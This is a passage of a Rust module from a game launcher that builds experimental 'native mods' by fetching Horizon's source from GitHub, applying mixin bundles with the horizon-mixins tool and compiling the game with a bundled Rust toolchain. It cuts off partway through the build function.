//! Native mods (docs/native-mods.md), experimental and off by default: mixin bundles that
//! levzzz5154's horizon-mixins (MIT, <https://github.com/horizon-rust/horizon-mixins>) applies to
//! Horizon's source, which the launcher then compiles into a game of its own with its portable Rust
//! ([`rust_toolchain`]). Unlike `.hmod` mods they are not sandboxed: their code runs with the
//! player's rights.
//!
//! A native mod pins the Horizon revision it was made for (a Nightly's or a release's commit).
//! Mods pinning different ones build on the newest of them, once the player agreed to try (they
//! often still apply and compile). A mod that hooks only Horizon's native hook points
//! (`game/native_hooks.rs`) names the version it needs instead (`hooks`): it builds on any Horizon
//! whose hook points have that version or a later one (they are only ever added to), the player's own
//! by default, so such mods always build together. The build compiles that revision's source, from
//! GitHub, never a checkout on this computer, and installs as its own version,
//! `native-<revision>-<key>` (the key hashes the revision, the mods' files, the tool's commit and
//! the profile, so the same set builds once). The instance the mods are installed in plays it, and
//! its next build stays on the same revision ([`base_for`]) until the player asks to update
//! ([`update_for`]), so a rebuild compiles only what the mods changed.
use crate::backend;
use crate::instances::{self, Instance};
use crate::rust_toolchain::{self, Toolchain};
use sha2::{Digest, Sha256};
use std::fs;
use std::io::{BufRead, BufReader, Write};
use std::path::{Path, PathBuf};
use std::process::{Command, Stdio};

const PREFIX: &str = "native-";
/// horizon-mixins, for bundles that don't name the revision they were tested with.
const MIXINS_GIT: &str = "https://github.com/horizon-rust/horizon-mixins";
pub const MIXINS_REV: &str = "3f99a5c60dfa311cc365524c44ae2fd799bfa1de";
/// The profile builds use: the workspace's `fast` (the release's optimizations without its
/// link-time ones, incremental), so a rebuild recompiles and links only what the mods changed.
/// A revision without it builds with `release` ([`profile_of`]).
const PROFILE: &str = "fast";
const FALLBACK_PROFILE: &str = "release";
/// The features of the release's own game (game-build.yml).
const FEATURES: &str = "horizon-client/mods";

/// Whether Native mods are on after an install into a game folder whose list is `installed`:
/// installing a native mod turns them on, so the player only has to build. A player who never
/// installs one keeps them off; one already on stays on.
pub fn turns_on(on: bool, installed: &[crate::browser::installed::Entry]) -> bool {
    on || installed.iter().any(|e| {
        e.file
            .strip_prefix(INSTALLED)
            .is_some_and(|rest| rest.starts_with('/'))
    })
}

/// Whether installing a native mod shows its notice first (what the first build takes): once,
/// for a player whose Native mods are still off.
pub fn needs_notice(on: bool, noticed: bool) -> bool {
    !on && !noticed
}

/// The notice before the first native mod is installed.
pub const NOTICE: &str = "Native mods compile into a game of their own. Installing one turns Native mods on: you then build the game with it in Settings > Native mods. The first build downloads Rust and can take 20 to 30 minutes; later builds are faster.";

/// Whether an installed version is a native-mods build.
pub fn is_native(version: &str) -> bool {
    version.starts_with(PREFIX)
}

pub(crate) fn root() -> PathBuf {
    backend::data_dir().join("native")
}

/// A canonical path without Windows' verbatim prefix: `canonicalize` gives `\\?\C:\...` there,
/// and horizon-mixins' output check stats `\\?\C:`, the volume itself, which Windows refuses
/// (os error 1). A drive path loses its `\\?\`; any other path is left as it is.
fn plain(path: PathBuf) -> PathBuf {
    match path.to_str().and_then(|p| p.strip_prefix(r"\\?\")) {
        Some(rest) if rest.as_bytes().get(1) == Some(&b':') => PathBuf::from(rest),
        _ => path,
    }
}

/// The build's log, kept until the next build.
pub fn log_path() -> PathBuf {
    root().join("build.log")
}

const MANIFEST: &str = "horizon-mixin.toml";
/// A registry download's manifest (`.hnmod`, `horizon_mods::index::native`), beside `mixins/<id>/`.
const NATIVE_MANIFEST: &str = horizon_mods::index::native::MANIFEST;
/// Where an instance keeps the native mods installed from the registry, `<id>.hnmod`, each on or
/// off in `horizon-mods.txt` like any mod.
pub const INSTALLED: &str = "horizon-native-mods";

/// The native mods turned on in the game folder `home`, unpacked into a folder [`build`] takes.
/// Each `.hnmod` is checked again as the registry checks it (Rust and TOML under
/// `mixins/<id>/`, plus files under its `data/`, nothing run).
pub fn installed_mods(home: &Path) -> Result<PathBuf, String> {
    let out = root().join("installed.incoming");
    let _ = fs::remove_dir_all(&out);
    let mut paths: Vec<PathBuf> = fs::read_dir(home.join(INSTALLED))
        .map(|dir| dir.flatten().map(|e| e.path()).collect())
        .unwrap_or_default();
    paths.retain(|p| p.extension().is_some_and(|e| e == "hnmod"));
    paths.sort();
    let mut count = 0;
    for path in paths {
        let bundle = horizon_mods::index::native::Bundle::read(&path)
            .map_err(|e| format!("{}: {e}", path.display()))?;
        if !crate::browser::java::is_enabled(home, &bundle.manifest.id) {
            continue;
        }
        let dir = out.join(&bundle.manifest.id);
        for (name, bytes) in &bundle.files {
            let to = dir.join(name);
            fs::create_dir_all(to.parent().unwrap_or(&dir)).map_err(|e| e.to_string())?;
            fs::write(&to, bytes).map_err(|e| format!("{}: {e}", to.display()))?;
        }
        count += 1;
    }
    if count == 0 {
        return Err(format!(
            "No native mod is turned on in {}: install one from the Mods page first.",
            home.join(INSTALLED).display()
        ));
    }
    Ok(out)
}

/// A mixin bundle: a folder with a `horizon-mixin.toml`, and the revisions it pins.
#[derive(Clone, Debug, PartialEq)]
pub struct Bundle {
    pub id: String,
    pub version: String,
    pub dir: PathBuf,
    /// The Horizon commit it builds on (`[compatibility] horizon_revision`, or its `.hnmod`'s).
    pub horizon: Option<String>,
    /// The horizon-mixins commit it was tested with (its `.hnmod`'s).
    pub mixins: Option<String>,
    /// The native hook points' version it needs (its `.hnmod`'s `hooks`): then `horizon` is the
    /// revision it was tested on, and it builds on any with these hook points or later ones.
    pub hooks: Option<u32>,
}

/// The bundles in `folder`: the folder itself when it is one (a `horizon-mixin.toml`, or an
/// unpacked `.hnmod`: `horizon-native.json` and `mixins/<id>/`), else each of its subfolders that is.
pub fn bundles(folder: &Path) -> Result<Vec<Bundle>, String> {
    if let Some(found) = bundle_in(folder)? {
        return Ok(vec![found]);
    }
    let mut dirs: Vec<PathBuf> = fs::read_dir(folder)
        .map_err(|e| format!("Could not read {}: {e}", folder.display()))?
        .flatten()
        .map(|e| e.path())
        .filter(|p| p.is_dir())
        .collect();
    dirs.sort();
    let mut found = Vec::new();
    for dir in dirs {
        found.extend(bundle_in(&dir)?);
    }
    if found.is_empty() {
        return Err(format!(
            "{} holds no native mod ({MANIFEST} or {NATIVE_MANIFEST}).",
            folder.display()
        ));
    }
    Ok(found)
}

pub(crate) fn bundle_in(dir: &Path) -> Result<Option<Bundle>, String> {
    if dir.join(MANIFEST).is_file() {
        return bundle(dir, None).map(Some);
    }
    let path = dir.join(NATIVE_MANIFEST);
    if !path.is_file() {
        return Ok(None);
    }
    let text = fs::read_to_string(&path).map_err(|e| format!("{}: {e}", path.display()))?;
    let native_json: serde_json::Value =
        serde_json::from_str(&text).map_err(|e| format!("{}: {e}", path.display()))?;
    let field = |name: &str| native_json[name].as_str().map(str::to_owned);
    let id = field("id").ok_or_else(|| format!("{} has no id.", path.display()))?;
    let found = bundle(&dir.join("mixins").join(&id), field("mixins"))?;
    match (&found.horizon, field("horizon")) {
        (Some(pinned), Some(native)) if *pinned != native => Err(format!(
            "{id}: {NATIVE_MANIFEST} pins Horizon {native}, its {MANIFEST} {pinned}."
        )),
        (_, native) => Ok(Some(Bundle {
            horizon: found.horizon.clone().or(native),
            hooks: native_json["hooks"]
                .as_u64()
                .and_then(|v| u32::try_from(v).ok()),
            ..found
        })),
    }
}

fn bundle(dir: &Path, mixins: Option<String>) -> Result<Bundle, String> {
    let path = dir.join(MANIFEST);
    let text = fs::read_to_string(&path).map_err(|e| format!("{}: {e}", path.display()))?;
    let value: toml::Table = text
        .parse()
        .map_err(|e| format!("{}: {e}", path.display()))?;
    let field = |table: &str, name: &str| {
        value
            .get(table)
            .and_then(|m| m.get(name))
            .and_then(|v| v.as_str())
            .map(str::to_owned)
    };
    let need = |name: &str| {
        field("mod", name).ok_or_else(|| format!("{} has no [mod] {name}.", path.display()))
    };
    Ok(Bundle {
        id: need("id")?,
        version: need("version")?,
        dir: dir.to_owned(),
        horizon: field("compatibility", "horizon_revision"),
        mixins,
        hooks: None,
    })
}

fn is_revision(text: &str) -> bool {
    text.len() == 40 && text.bytes().all(|b| matches!(b, b'0'..=b'9' | b'a'..=b'f'))
}

/// The one value the bundles pin for `which` (each mod's `get`), else `fallback`; mods that pin
/// different ones can't be built together, and the error says which.
fn agreed(
    bundles: &[Bundle],
    which: &str,
    get: impl Fn(&Bundle) -> Option<&String>,
    fallback: impl FnOnce() -> Result<String, String>,
) -> Result<String, String> {
    let mut pins: Vec<(&String, &str)> = bundles
        .iter()
        .filter_map(|b| get(b).map(|r| (r, b.id.as_str())))
        .collect();
    pins.sort();
    let revision = match pins.first() {
        None => fallback()?,
        Some((first, _)) if pins.iter().all(|(r, _)| r == first) => (*first).clone(),
        Some(_) => {
            let list: Vec<String> = pins
                .iter()
                .map(|(r, id)| format!("{id} → {}", &r[..r.len().min(7)]))
                .collect();
            return Err(format!(
                "These mods were made for different {which} revisions and can't be built together: {}. Install versions made for the same Nightly.",
                list.join(", ")
            ));
        }
    };
    if !is_revision(&revision) {
        return Err(format!(
            "{revision} is not a {which} commit (40 hex digits)."
        ));
    }
    Ok(revision)
}

/// The revision `bundles` build on for `which` when their pins differ: the newest of the pins and
/// `also` (the launcher's own horizon-mixins), by its commit's time (`date`), so no mod gets an
/// older one than it was made for. With one pin or none, it is [`agreed`]'s.
fn newest(
    bundles: &[Bundle],
    which: &str,
    get: impl Fn(&Bundle) -> Option<&String>,
    fallback: impl FnOnce() -> Result<String, String>,
    also: Option<&str>,
    date: impl Fn(&str) -> Result<String, String>,
) -> Result<String, String> {
    let mut pins: Vec<&str> = bundles
        .iter()
        .filter_map(|b| get(b).map(String::as_str))
        .collect();
    pins.sort();
    pins.dedup();
    if pins.len() < 2 {
        return agreed(bundles, which, get, fallback);
    }
    if let Some(bad) = pins.iter().find(|p| !is_revision(p)) {
        return Err(format!("{bad} is not a {which} commit (40 hex digits)."));
    }
    pins.extend(also.filter(|a| !pins.contains(a)));
    let mut dated = Vec::new();
    for pin in pins {
        let when = date(pin).map_err(|e| {
            format!("Can't tell which of the mods' {which} revisions is newest: {e}")
        })?;
        dated.push((when, pin));
    }
    Ok(dated
        .into_iter()
        .max()
        .map(|(_, p)| p.to_owned())
        .unwrap_or_default())
}

/// When commit `revision` of GitHub's `repo` was made (ISO 8601, so it sorts), from the dates kept
/// in [`DATES`] when it was asked before: a commit's date never changes, so a build of mods made
/// for different revisions can be used again offline or past GitHub's rate limit.
fn committed(repo: &str, revision: &str) -> Result<String, String> {
    remembered(&root().join(DATES), repo, revision, ask_github)
}

/// The file in [`root`] keeping the commit dates GitHub gave, as `{"repo@revision": date}`.
const DATES: &str = "commit-dates.json";

/// The date `file` keeps for `repo`'s `revision`, else `ask`'s, then kept in `file`.
fn remembered(
    file: &Path,
    repo: &str,
    revision: &str,
    ask: impl FnOnce(&str, &str) -> Result<String, String>,
) -> Result<String, String> {
    let key = format!("{repo}@{revision}");
    let mut dates: serde_json::Map<String, serde_json::Value> = fs::read(file)
        .ok()
        .and_then(|b| serde_json::from_slice(&b).ok())
        .unwrap_or_default();
    if let Some(date) = dates.get(&key).and_then(|d| d.as_str()) {
        return Ok(date.to_owned());
    }
    let date = ask(repo, revision)?;
    dates.insert(key, date.clone().into());
    if let Ok(text) = serde_json::to_vec_pretty(&dates) {
        let _ = fs::write(file, text);
    }
    Ok(date)
}

fn ask_github(repo: &str, revision: &str) -> Result<String, String> {
    let url = format!("https://api.github.com/repos/{repo}/commits/{revision}");
    let commit: serde_json::Value = backend::get(&url)?.into_json().map_err(|e| e.to_string())?;
    commit["commit"]["committer"]["date"]
        .as_str()
        .map(str::to_owned)
        .ok_or_else(|| format!("GitHub doesn't know {repo} commit {revision}."))
}

/// How [`build`] starts its error when mods pin other Horizon revisions than the one it would
/// use and the player hasn't agreed to try (`anyway`); the rest lists them.
pub const MISMATCH: &str = "Made for other Horizon versions: ";

/// Each pinned mod whose Horizon revision isn't `revision`, as `id → pin`, and the build's.
fn mismatch(mods: &[Bundle], revision: &str) -> Option<String> {
    let list: Vec<String> = mods
        .iter()
        .filter(|b| b.hooks.is_none())
        .filter_map(|b| b.horizon.as_ref().map(|r| (b, r)))
        .filter(|(_, r)| *r != revision)
        .map(|(b, r)| format!("{} → {}", b.id, &r[..r.len().min(7)]))
        .collect();
    (!list.is_empty()).then(|| {
        format!(
            "{}; the build uses {}",
            list.join(", "),
            &revision[..revision.len().min(7)]
        )
    })
}

/// Where Horizon declares its native hook points' version, and the line that does.
const HOOKS_FILE: &str = "crates/horizon-client/src/game/native_hooks.rs";
const HOOKS_LINE: &str = "pub(crate) const NATIVE_HOOKS_API: u32 = ";

/// The native hook points' version in `HOOKS_FILE`'s text.
fn hooks_in(source: &str) -> Option<u32> {
    let line = source.lines().find_map(|l| l.strip_prefix(HOOKS_LINE))?;
    line.trim_end().strip_suffix(';')?.parse().ok()
}

/// The native hook points' version of Horizon at `revision`, from GitHub (None: it has none).
fn hooks_at(revision: &str) -> Option<u32> {
    let url = format!(
        "https://raw.githubusercontent.com/{}/{revision}/{HOOKS_FILE}",
        backend::REPO
    );
    let text = backend::get(&url).ok()?.into_string().ok()?;
    hooks_in(&text)
}

/// The revision to build `mods` on: `pinned` (the pins' agreement, else the installed version's)
/// when every mod naming a hook points' version finds it or a later one there (`at` reads a
/// revision's). Else, when nothing pins it, the revision those mods were tested on.
fn with_hooks(
    mods: &[Bundle],
    pinned: String,
    free: bool,
    at: impl Fn(&str) -> Option<u32>,
) -> Result<String, String> {
    let hooked: Vec<&Bundle> = mods.iter().filter(|b| b.hooks.is_some()).collect();
    let fits = |revision: &str| {
        let found = at(revision);
        hooked.iter().all(|b| found.is_some() && b.hooks <= found)
    };
    if hooked.is_empty() || fits(&pinned) {
        return Ok(pinned);
    }
    let tested: Vec<Bundle> = hooked.iter().map(|b| (*b).clone()).collect();
    let fallback = agreed(
        &tested,
        "Horizon",
        |b| b.horizon.as_ref(),
        || Err(String::new()),
    );
    if let (true, Ok(revision)) = (free, fallback) {
        if fits(&revision) {
            return Ok(revision);
        }
    }
    let list: Vec<String> = hooked
        .iter()
        .map(|b| format!("{} (hook points v{})", b.id, b.hooks.unwrap_or_default()))
        .collect();
    Err(format!(
        "Horizon {} doesn't have the native hook points these mods use: {}. Update Horizon or the mods.",
        &pinned[..pinned.len().min(7)],
        list.join(", ")
    ))
}

/// A bundle that names a hook points' version builds on another revision than the one it was
/// tested on: its `horizon_revision` (which horizon-mixins checks) becomes the build's.
fn repin(bundle: &Bundle, revision: &str) -> Result<(), String> {
    let path = bundle.dir.join(MANIFEST);
    let text = fs::read_to_string(&path).map_err(|e| format!("{}: {e}", path.display()))?;
    let mut value: toml::Table = text
        .parse()
        .map_err(|e| format!("{}: {e}", path.display()))?;
    if let Some(toml::Value::Table(compat)) = value.get_mut("compatibility") {
        compat.insert("horizon_revision".into(), revision.into());
    }
    let text = toml::to_string(&value).map_err(|e| e.to_string())?;
    fs::write(&path, text).map_err(|e| format!("{}: {e}", path.display()))
}

/// Whether Horizon's source at `source` has the `mods` feature (the WebAssembly mods' runtime,
/// gone from later revisions).
fn has_mods_feature(source: &Path) -> bool {
    let path = source.join("crates/horizon-client/Cargo.toml");
    let text = fs::read_to_string(path).unwrap_or_default();
    let value: toml::Table = text.parse().unwrap_or_default();
    value.get("features").and_then(|f| f.get("mods")).is_some()
}

/// The profile the source at `source` builds with: [`PROFILE`] where its Cargo.toml has it.
fn profile_of(source: &Path) -> &'static str {
    let text = fs::read_to_string(source.join("Cargo.toml")).unwrap_or_default();
    let value: toml::Table = text.parse().unwrap_or_default();
    match value.get("profile").and_then(|p| p.get(PROFILE)) {
        Some(_) => PROFILE,
        None => FALLBACK_PROFILE,
    }
}

/// The Horizon commit `version` (an installed release or Nightly) was built from, from GitHub.
pub fn revision_of(version: &str) -> Result<String, String> {
    let reference = match version.strip_prefix("nightly-") {
        // nightly-2026-10-28-0c02067: the commit is its last word.
        Some(rest) => rest.rsplit('-').next().unwrap_or(rest),
        None => version,
    };
    let url = format!(
        "https://api.github.com/repos/{}/commits/{reference}",
        backend::REPO
    );
    let commit: serde_json::Value = backend::get(&url)?.into_json().map_err(|e| e.to_string())?;
    commit["sha"]
        .as_str()
        .filter(|s| is_revision(s))
        .map(str::to_owned)
        .ok_or_else(|| format!("GitHub doesn't know the commit of {version}."))
}

/// What a native build was made from: its `native-mods.json`.
#[derive(Clone, Debug, PartialEq)]
pub struct About {
    /// The release or Nightly it started from.
    pub base: String,
    /// The Horizon commit it compiled.
    pub horizon: String,
}

/// What installed native build `version` was made from; None for any other version.
pub fn about(version: &str) -> Option<About> {
    if !is_native(version) {
        return None;
    }
    let path = backend::version_dir(version).join("native-mods.json");
    let json: serde_json::Value = serde_json::from_str(&fs::read_to_string(path).ok()?).ok()?;
    let field = |name: &str| json[name].as_str().map(str::to_owned);
    Some(About {
        base: field("base")?,
        horizon: field("horizon").filter(|r| is_revision(r))?,
    })
}

/// The newest installed release or Nightly in `installed` (newest first).
fn newest_installed(installed: &[String]) -> Option<&String> {
    installed
        .iter()
        .find(|t| backend::is_game_tag(t) || t.starts_with("nightly-"))
}

/// The installed version a build for an instance that plays `current` starts from: `current`
/// itself, so a rebuild stays on the Horizon it plays (a native build's own revision, [`about`]).
/// With `update`, or when it plays nothing installed, the newest installed release or Nightly.
pub fn base_for(current: Option<&str>, installed: &[String], update: bool) -> Option<String> {
    match current {
        Some(v) if !update && installed.iter().any(|t| t == v) => Some(v.to_owned()),
        _ => newest_installed(installed).cloned(),
    }
}

/// The newer Horizon a build with `update` would move native build `version` to: the newest
/// installed release or Nightly, when it is newer than the one the build started from.
pub fn update_for(version: &str, installed: &[String]) -> Option<String> {
    newer_than(&about(version)?.base, installed)
}

fn newer_than(base: &str, installed: &[String]) -> Option<String> {
    newest_installed(installed)
        .filter(|n| *n != base && backend::compare_versions(n, base).is_gt())
        .cloned()
}

/// Every file under `dir`, by its path relative to `dir` (with `/`), sorted. A symlink is refused:
/// horizon-mixins refuses them too.
fn files(dir: &Path) -> Result<Vec<(String, PathBuf)>, String> {
    fn walk(root: &Path, dir: &Path, out: &mut Vec<(String, PathBuf)>) -> Result<(), String> {
        for entry in fs::read_dir(dir).map_err(|e| e.to_string())?.flatten() {
            let (path, kind) = (entry.path(), entry.file_type().map_err(|e| e.to_string())?);
            if kind.is_symlink() {
                return Err(format!(
                    "{} is a link: copy the file instead.",
                    path.display()
                ));
            } else if kind.is_dir() {
                walk(root, &path, out)?;
            } else {
                let relative = path.strip_prefix(root).unwrap_or(&path);
                out.push((relative.to_string_lossy().replace('\\', "/"), path));
            }
        }
        Ok(())
    }
    let mut out = Vec::new();
    walk(dir, dir, &mut out)?;
    out.sort();
    Ok(out)
}

/// The installed version `bundles` built on Horizon `revision` with horizon-mixins `mixins`
/// become: `native-<7 digits of the revision>-<12 hex digits>`.
pub fn version_for(revision: &str, mixins: &str, bundles: &[Bundle]) -> Result<String, String> {
    let mut hash = Sha256::new();
    for part in [mixins, PROFILE, FEATURES, rust_toolchain::VERSION, revision] {
        hash.update(part.as_bytes());
        hash.update([0]);
    }
    let mut sorted: Vec<&Bundle> = bundles.iter().collect();
    sorted.sort_by(|a, b| a.id.cmp(&b.id));
    for b in sorted {
        hash.update(b.id.as_bytes());
        hash.update([0]);
        for (name, path) in files(&b.dir)? {
            let bytes = fs::read(&path).map_err(|e| format!("{}: {e}", path.display()))?;
            hash.update(name.as_bytes());
            hash.update((bytes.len() as u64).to_le_bytes());
            hash.update(&bytes);
        }
    }
    let key: String = hash.finalize()[..6]
        .iter()
        .map(|b| format!("{b:02x}"))
        .collect();
    Ok(format!("{PREFIX}{}-{key}", &revision[..7]))
}

/// Where a build is.
#[derive(Clone, Debug, PartialEq)]
pub enum Step {
    Rust(f32),
    Tool,
    Source(String),
    Mixins,
    /// Crates compiled so far, and the last one.
    Compile(usize, String),
    Install,
}

impl Step {
    pub fn label(&self) -> String {
        match self {
            Self::Rust(done) => format!(
                "Downloading Rust {} (once): {:.0}%",
                rust_toolchain::VERSION,
                done * 100.0
            ),
            Self::Tool => "Building horizon-mixins (once)".into(),
            Self::Source(revision) => {
                format!("Downloading Horizon's source at {}", &revision[..7])
            }
            Self::Mixins => "Applying the mixins".into(),
            Self::Compile(n, name) => format!("Compiling the game: {n} crates, now {name}"),
            Self::Install => "Installing the build".into(),
        }
    }
}

/// Runs `cmd`, its output appended to the build log; `line` sees each line of its standard error.
/// An error ends with its first `error` lines and the last lines: a failed build script's output
/// alone could push the line naming its crate out of the last ones.
fn run(mut cmd: Command, what: &str, mut line: impl FnMut(&str)) -> Result<(), String> {
    let mut log = fs::OpenOptions::new()
        .create(true)
        .append(true)
        .open(log_path())
        .map_err(|e| e.to_string())?;
    let _ = writeln!(log, "$ {cmd:?}");
    let stdout = log.try_clone().map_err(|e| e.to_string())?;
    let mut child = cmd
        .stdout(stdout)
        .stderr(Stdio::piped())
        .spawn()
        .map_err(|e| format!("Could not start {what}: {e}"))?;
    let mut tail = std::collections::VecDeque::new();
    let mut errors = Vec::new();
    for text in BufReader::new(child.stderr.take().expect("piped"))
        .lines()
        .map_while(Result::ok)
    {
        let _ = writeln!(log, "{text}");
        line(&text);
        if text.starts_with("error") && errors.len() < 4 {
            errors.push(text.clone());
        }
        if tail.len() == 12 {
            tail.pop_front();
        }
        tail.push_back(text);
    }
    let status = child.wait().map_err(|e| e.to_string())?;
    if status.success() {
        return Ok(());
    }
    let tail: Vec<String> = tail.into();
    Err(failure(what, &status.to_string(), &errors, &tail))
}

/// [`run`]'s error: the `errors` lines not already among the last ones (`tail`), then those.
fn failure(what: &str, status: &str, errors: &[String], tail: &[String]) -> String {
    let end = diagnostic(&tail.join("\n")).unwrap_or_else(|| tail.join("\n"));
    let first: Vec<&str> = errors
        .iter()
        .filter(|e| !tail.contains(e))
        .map(String::as_str)
        .collect();
    let (shown, first) = if first.is_empty() {
        ("The end of its output", String::new())
    } else {
        (
            "Its first errors and the end of its output",
            format!("{}\n…\n", first.join("\n")),
        )
    };
    format!(
        "{what} failed ({status}). {shown}, the whole of it in {}:\n{first}{end}",
        log_path().display()
    )
}

/// A horizon-mixins diagnostic (`{"code", "message", "file"}`) in one line.
fn diagnostic(text: &str) -> Option<String> {
    let start = text.find('{')?;
    let value: serde_json::Value = serde_json::from_str(&text[start..]).ok()?;
    let mut line = format!(
        "{}: {}",
        value["code"].as_str()?,
        value["message"].as_str()?
    );
    if let Some(file) = value["file"].as_str() {
        line += &format!(" ({file})");
    }
    Some(line)
}

/// horizon-mixins at commit `rev`, built once with the launcher's cargo (`cargo install --locked`).
fn tool(rust: &Toolchain, rev: &str) -> Result<PathBuf, String> {
    let dir = root().join("tools").join(&rev[..12]);
    let bin = dir
        .join("bin")
        .join(format!("horizon-mixins{}", std::env::consts::EXE_SUFFIX));
    if !bin.is_file() {
        let mut cmd = rust.command(&rust.cargo());
        rust_toolchain::low_priority(&mut cmd);
        cmd.args([
            "install", "--locked", "--git", MIXINS_GIT, "--rev", rev, "--root",
        ])
        .arg(&dir)
        .arg("horizon-mixins-cli");
        run(cmd, "Building horizon-mixins", |_| {})?;
    }
    Ok(bin)
}

/// `horizon-mixins apply`: the mods in `mods` applied to `source`, into `out`. It runs
/// `cargo metadata`, so it gets the launcher's toolchain like a build does: on a computer with no
/// Rust of its own, a plain command found no cargo (E_METADATA).
fn apply(rust: &Toolchain, tool: &Path, source: &Path, mods: &Path, out: &Path) -> Command {
    let mut cmd = rust.command(tool);
    cmd.arg("apply").arg("--workspace").arg(source);
    cmd.arg("--mods").arg(mods).arg("--out").arg(out);
    cmd
}

/// The release's own build of the game in `stage` (game-build.yml), into `target`. It starts
/// outside any Cargo configuration of the player's ([`rust_toolchain::outside_configs`]), so only
/// the workspace's own (`stage/.cargo/config.toml`, when it has one) applies.
fn compile(rust: &Toolchain, stage: &Path, target: &Path) -> Command {
    let mut cmd = rust.command(&rust.cargo());
    rust_toolchain::low_priority(&mut cmd);
    cmd.env("CARGO_TARGET_DIR", target);
    cmd.arg("build");
    let config = stage.join(".cargo").join("config.toml");
    if config.is_file() {
        cmd.arg("--config").arg(config);
    }
    cmd.arg("--manifest-path").arg(stage.join("Cargo.toml"));
    cmd.args(["--locked", "--profile", profile_of(stage)]);
    if has_mods_feature(stage) {
        cmd.args(["--features", FEATURES]);
    }
    cmd.args(["-p", "horizon-client", "--bin", "horizon-client"]);
    cmd
}

/// Horizon's source at commit `revision`: GitHub's archive of it, unpacked once, with the commit in
/// `.horizon-revision` (bundles pin it). A Nightly's commit stays downloadable after the Nightly
/// is gone: its `nightly-source/…` tag keeps it (docs/release-flow.md). Links are left out:
/// horizon-mixins refuses them, and none is needed to build.
fn source(revision: &str) -> Result<PathBuf, String> {
    let dir = root().join("source").join(revision);
    if dir.join(".horizon-revision").is_file() {
        return Ok(dir);
    }
    let archive = format!(
        "https://codeload.github.com/{}/tar.gz/{revision}",
        backend::REPO
    );
    let partial = root().join("source").join(format!(".{revision}.partial"));
    let top = unpack_archive(&archive, &partial, u64::MAX)?;
    fs::write(top.join(".horizon-revision"), revision).map_err(|e| e.to_string())?;
    let _ = fs::remove_dir_all(&dir);
    fs::rename(&top, &dir).map_err(|e| e.to_string())?;
    let _ = fs::remove_dir_all(&partial);
    Ok(dir)
}

/// GitHub's archive (`.tar.gz`) at `url`, unpacked into the fresh folder `partial`: the archive's
/// one top folder, which is returned. Links are left out; at most `limit` bytes are unpacked.
pub(crate) fn unpack_archive(url: &str, partial: &Path, limit: u64) -> Result<PathBuf, String> {
    use std::io::Read;
    let _ = fs::remove_dir_all(partial);
    fs::create_dir_all(partial).map_err(|e| e.to_string())?;
    let reader = flate2::read::GzDecoder::new(backend::get(url)?.into_reader()).take(limit);
    let mut tar = tar::Archive::new(reader);
    for entry in tar.entries().map_err(|e| e.to_string())? {
        let mut entry = entry.map_err(|e| format!("Download interrupted: {e}"))?;
        let kind = entry.header().entry_type();
        if !(kind.is_file() || kind.is_dir()) {
            continue;
        }
        entry
            .unpack_in(partial)
            .map_err(|e| format!("Could not unpack the source: {e}"))?;
    }
    // The archive's one top folder (<repo>-<commit>/) is the source's root.
    fs::read_dir(partial)
        .map_err(|e| e.to_string())?
        .flatten()
        .map(|e| e.path())
        .find(|p| p.is_dir())
        .ok_or_else(|| "The source archive is empty.".into())
}

/// Makes `to` hold `from`'s files, writing only those that changed, so Cargo, which goes by file
/// times, recompiles only what the mods changed.
fn sync(from: &Path, to: &Path) -> Result<(), String> {
    let new = files(from)?;
    let old = if to.is_dir() { files(to)? } else { Vec::new() };
    for (name, path) in &new {
        let target = to.join(name);
        if fs::read(&target).ok() != fs::read(path).ok() {
            fs::create_dir_all(target.parent().unwrap_or(to)).map_err(|e| e.to_string())?;
            fs::copy(path, &target).map_err(|e| format!("{}: {e}", target.display()))?;
        }
    }
    for (name, path) in old {
        if new.binary_search_by(|(n, _)| n.cmp(&name)).is_err() {
            let _ = fs::remove_file(path);
        }
    }
    Ok(())
}

/// Builds `folder`'s mods on the Horizon revision they pin (else `base`'s, the installed version
/// whose game files the build reuses: a native build's own revision when it is one, [`base_for`])
/// and points `instance` at the build: the instance the mods were installed in, else (None, or
/// the game's own home) the Native mods instance. Returns the build's version; a build already
/// made is used again. Mods pinning different revisions build on the newest one, with the newest
/// horizon-mixins they name, only when the player agreed to try (`anyway`): else the error starts
/// with [`MISMATCH`] and says which.
pub fn build(
    base: &str,
    folder: &Path,
    instance: &Instance,
    anyway: bool,
    progress: impl Fn(Step),
) -> Result<String, String> {
    backend::need_prepared(base)?;
    fs::create_dir_all(root()).map_err(|e| e.to_string())?;
    let _ = fs::write(log_path(), "");
    // The mods are copied first: the build and its key use the copy, whatever happens to the
    // folder meanwhile.
    let incoming = root().join("mods.incoming");
    let _ = fs::remove_dir_all(&incoming);
    let found = bundles(folder)?;
    // A native build starts from the release or Nightly it was made from, on its own revision.
    let built_on = about(base);
    let origin = built_on.as_ref().map_or(base, |a| a.base.as_str());
    for b in &found {
        backend::copy_dir(&b.dir, &incoming.join(&b.id)).map_err(|e| e.to_string())?;
    }
    let mods: Vec<Bundle> = found
        .into_iter()
        .map(|b| Bundle {
            dir: incoming.join(&b.id),
            ..b
        })
        .collect();
    // A mod naming a hook points' version doesn't pin: it follows the others, else the game.
    let pins: Vec<Bundle> = mods.iter().filter(|b| b.hooks.is_none()).cloned().collect();
    let free = pins.iter().all(|b| b.horizon.is_none());
    let pinned = newest(
        &pins,
        "Horizon",
        |b| b.horizon.as_ref(),
        || match &built_on {
            Some(about) => Ok(about.horizon.clone()),
            None => revision_of(base),
        },
        None,
        |r| committed(backend::REPO, r),
    )?;
    let revision = with_hooks(&mods, pinned, free, hooks_at)?;
    let other = mismatch(&mods, &revision);
    if let (Some(list), false) = (&other, anyway) {
        return Err(format!("{MISMATCH}{list}."));
    }
    for b in mods
        .iter()
        .filter(|b| b.hooks.is_some() || b.horizon.as_ref().is_some_and(|r| *r != revision))
    {
        repin(b, &revision)?;
    }
    // Said with a failure: a mod made for another revision may not apply or compile on this one.
    let blame = |e: String| {
        match &other {
        Some(list) => format!("{e}\n\nSome mods were made for other Horizon versions ({list}), which may be why. Install versions made for the same Nightly."),
        None => e,
    }
    };
    let mixins = newest(
        &mods,
        "horizon-mixins",
        |b| b.mixins.as_ref(),
        || Ok(MIXINS_REV.into()),
        Some(MIXINS_REV),
        |r| committed("horizon-rust/horizon-mixins", r),
    )?;
    let version = version_for(&revision, &mixins, &mods)?;
    if !backend::installed().contains(&version) {
        rust_toolchain::linker()?;
        let rust = rust_toolchain::install(|f| progress(Step::Rust(f)))?;
        progress(Step::Tool);
        let tool = tool(&rust, &mixins)?;
        progress(Step::Source(revision.clone()));
        let source = source(&revision)?;
        progress(Step::Mixins);
        // horizon-mixins refuses an output path through a link (macOS's /tmp is one).
